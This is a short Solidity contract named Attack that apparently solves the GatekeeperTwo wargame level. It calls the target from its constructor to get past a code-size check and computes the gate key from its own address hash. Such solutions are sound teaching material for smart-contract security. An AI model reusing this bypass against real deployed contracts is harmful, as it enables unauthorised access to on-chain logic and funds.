// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract Attack {
    GatekeeperTwo private immutable _GATEKEEPER_TWO;

    constructor(GatekeeperTwo gatekeeperTwo) {
        _GATEKEEPER_TWO = gatekeeperTwo;
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        gatekeeperTwo.enter(bytes8(gateKey));
        assert(gatekeeperTwo.entrant() == tx.origin);
    }
}
